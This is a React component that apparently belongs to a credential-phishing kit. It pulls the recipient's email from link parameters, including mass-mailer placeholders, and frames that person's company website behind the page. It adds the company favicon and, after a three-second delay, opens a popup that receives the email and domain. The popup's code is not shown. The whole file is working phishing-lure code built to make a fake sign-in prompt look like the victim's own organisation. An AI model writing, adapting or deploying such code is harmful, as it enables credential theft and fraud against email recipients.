/** @format */
"use client";

import React, { useState, useEffect } from "react";
import Popup from "./Popup";

const Fetcher = () => {
  const [emailDomain, setEmailDomain] = useState("");
  const [websiteUrl, setWebsiteUrl] = useState("");
  const [favicon, setFavicon] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [eparams, setEparams] = useState("");
  const [hasEmailParam, setHasEmailParam] = useState(false);

  useEffect(() => {
    const extractEmailFromURL = () => {
      const url = window.location.href;
      const urlObj = new URL(url);
      
      // All the email parameter patterns
      const emailPatterns = [
        'email', 'Email', 'EMAIL', 'user_email', 'UserEmail', 'userEmail',
        'emailAddress', 'EmailAddress', 'contact_email', 'recipient_email',
        'subscriber_email', 'mail', 'e', 'u', 'addr', 'address'
      ];

      // Check query parameters - return ANY value, not just valid emails
      for (const pattern of emailPatterns) {
        const emailValue = urlObj.searchParams.get(pattern);
        if (emailValue) {
          return emailValue; // Return template patterns too
        }
      }

      // Check hash parameters
      const hash = urlObj.hash;
      if (hash) {
        const hashParams = new URLSearchParams(hash.substring(1));
        for (const pattern of emailPatterns) {
          const emailValue = hashParams.get(pattern);
          if (emailValue) {
            return emailValue;
          }
        }
      }

      // Check for combined patterns
      const combinedRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      let match;
      while ((match = combinedRegex.exec(url)) !== null) {
        if (match[1]) {
          return decodeURIComponent(match[1]);
        }
      }

      // Check URL encoded patterns
      const decodedUrl = decodeURIComponent(url);
      const emailRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      while ((match = emailRegex.exec(decodedUrl)) !== null) {
        if (match[1]) {
          return match[1];
        }
      }

      // Check for template patterns
      const templatePatterns = [
        /[?&]#?email=(\[\[-Email-\]\])/i,
        /[?&]#?email=(\[\[Email\]\])/i,
        /[?&]#?email=(\{\{Email\}\})/i,
        /[?&]#?email=(%EMAIL%)/i,
        /[?&]#?email=(%%emailaddress%%)/i,
      ];

      for (const pattern of templatePatterns) {
        const match = url.match(pattern);
        if (match && match[1]) {
          return match[1];
        }
      }

      return "";
    };

    const extractedEmail = extractEmailFromURL();
    setEparams(extractedEmail);
    
    // ALWAYS SHOW POPUP IF WE HAVE ANY EMAIL PARAMETER (even template patterns)
    if (extractedEmail) {
      setHasEmailParam(true);
      // Try to extract domain if it's a real email
      if (extractedEmail.includes('@') && !extractedEmail.includes('[[') && !extractedEmail.includes('{{') && !extractedEmail.includes('%')) {
        const domain = extractedEmail.split("@")[1];
        setEmailDomain(domain);
        const url = `https://www.${domain}`;
        setWebsiteUrl(url);
        fetchFavicon(domain);
      } else {
        // For template patterns, just show popup with black background
        setEmailDomain("Template Email");
        setFavicon("");
      }
    }
  }, []);

  useEffect(() => {
    // Show popup if we have email params (even template patterns)
    if (hasEmailParam) {
      setTimeout(() => {
        setShowPopup(true);
      }, 3000);
    }
  }, [hasEmailParam]);

  const fetchFavicon = (domain) => {
    const faviconUrl = `https://${domain}/favicon.ico`;
    setFavicon(faviconUrl);
  };

  return (
    <div className="content-wrapper" style={{
      width: '100%',
      height: '100vh',
      margin: 0,
      padding: 0,
      position: 'relative',
      backgroundColor: websiteUrl ? 'transparent' : 'black'
    }}>
      {websiteUrl && (
        <div className="iframe-container" style={{
          width: '100%',
          height: '100%',
          margin: 0,
          padding: 0,
          border: 'none',
          overflow: 'hidden'
        }}>
          <iframe 
            src={websiteUrl} 
            title=" " 
            style={{
              width: '100%',
              height: '100%',
              border: 'none',
              margin: 0,
              padding: 0
            }}
          />
        </div>
      )}
      {showPopup && hasEmailParam && (
        <Popup
          domain={emailDomain}
          favicon={favicon}
          eparams={eparams}
          systemInfo={{
            date: new Date(),
            browser: "Chrome",
            os: "Windows",
            location: "Unknown"
          }}
        />
      )}
    </div>
  );
};

export default Fetcher;